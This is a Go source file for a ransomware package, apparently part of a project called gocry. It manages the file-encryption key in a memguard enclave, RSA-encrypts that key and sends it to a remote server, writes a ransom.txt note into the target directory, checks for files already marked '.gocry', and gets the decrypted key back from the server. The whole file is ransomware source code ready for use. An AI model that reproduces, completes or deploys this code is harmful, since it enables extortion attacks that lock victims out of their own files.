package ransomware

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/awnumar/memguard"
	"github.com/nireo/gocry/config"
	"github.com/nireo/gocry/crypt"
	"github.com/nireo/gocry/utils"
	"github.com/nireo/gocry/victim"
)

// Ransomware holds all the needed client information needed to go forward with the ransom.
type Ransomware struct {
	MemguardKey *memguard.Enclave
	PublicKey   string
	RootDir     string
	IP          string
	Data        *victim.VictimIndentifier
}

// CheckIfActiveRansom checks for any files with the .gocry extension such that then
// the ransomware knows not to re-ecrypt the files.
func (rw *Ransomware) CheckIfActiveRansom() error {
	if encrypted := checkIfEncrypted(rw.RootDir); encrypted {
		return errors.New("some files are already encrypted")
	}

	// check if ransom.txt and key.txt exists in the root directory.
	if _, err := os.Stat(rw.RootDir + "/key.txt"); !os.IsNotExist(err) {
		return errors.New("a key.txt already exists: " + err.Error())
	}

	if _, err := os.Stat(rw.RootDir + "/ransom.txt"); !os.IsNotExist(err) {
		return errors.New("a ransom.txt file already exists: " + err.Error())
	}

	return nil
}

// CreateTextFiles is responsible for creating the  ransom.txt. The message
// is taken as a parameter since it makes the main file look more clear and configurable.
func (rw *Ransomware) CreateRansomInfoFile(message string) error {
	file, err := os.Create(rw.RootDir + "/ransom.txt")
	if err != nil {
		return errors.New("could not create ransom.txt file: " + err.Error())
	}
	defer file.Close()

	if _, err := file.WriteString(message); err != nil {
		return errors.New("could not write message to file: " + err.Error())
	}

	return nil
}

func checkIfEncrypted(rootPath string) bool {
	if err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		if strings.HasSuffix(path, ".gocry") {
			return errors.New("a encrypted file has already been found")
		}

		return nil
	}); err != nil {
		return false
	}

	return true
}

// GetValidKeyFromServer sends a post request which contains the encryption key and then the
// server decrypts the key using the rsa private key and sends it back.
func (rw *Ransomware) GetValidKeyFromServer() error {
	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
	if err != nil {
		return err
	}

	decryptedkey, err := rw.Data.GetKeyFromServer(key)
	if err != nil {
		return err
	}

	if err := rw.RemoveKeyFile(); err != nil {
		return err
	}

	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", decryptedkey, 0600); err != nil {
		return err
	}

	return nil
}

// CheckIfValidMemSafeKey checks if the key inside the memguard enclave is the same as the key
// written inside of key.txt
func (rw *Ransomware) CheckIfValidMemSafeKey() bool {
	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
	if err != nil {
		return false
	}

	b, err := rw.MemguardKey.Open()
	if err != nil {
		return false
	}
	defer b.Destroy()

	fmt.Println(key)
	fmt.Println(b.Bytes())

	if bytes.Equal(key, b.Bytes()) {
		return true
	}

	return false
}

// WriteMemSafeKey writes the encryption key to a file using a public key from the server.
// The key is passed through crypt.EncryptKey, whichs gets the public key and encrypts it as well.
func (rw *Ransomware) WriteMemSafeKey() error {
	b, err := rw.MemguardKey.Open()
	if err != nil {
		memguard.SafePanic(err)
	}
	defer b.Destroy()

	rsaEncryptedKey, err := crypt.EncryptKey(b.Bytes(), rw.Data.UUID)
	if err != nil {
		return err
	}

	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", rsaEncryptedKey, 0600); err != nil {
		return err
	}

	return nil
}

// RemoveKeyFile removes the generated key file which holds the decryption key to the
// encrypted files.
func (rw *Ransomware) RemoveKeyFile() error {
	if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
		return err
	}

	return nil
}

// RemoveRansomFile removes the generated ransom file which notifies user that the computer
// is under ransom.
func (rw *Ransomware) RemoveRansomFile() error {
	if err := os.Remove(rw.RootDir + "/ransom.txt"); err != nil {
		return err
	}

	return nil
}

// SendKeyToServer sends the encryption key with rsa encryption to the server.
func (rw *Ransomware) SendKeyToServer() error {
	if err := utils.EncryptionKeyToServer(rw.MemguardKey, rw.Data.UUID); err != nil {
		return err
	}

	return nil
}

// NewRansomware creates a new ransomware instance given a starting directory.
// This function automatically generates a 32-bit encryption key to encrypt files.
func NewRansomware() (*Ransomware, error) {
	key, err := utils.Gen32BitKey()
	if err != nil {
		return nil, err
	}

	return &Ransomware{
		RootDir:     config.GetConfig().RootDirectory,
		MemguardKey: memguard.NewEnclave(key),
		Data:        victim.NewVictimIndentifer(),
	}, nil
}
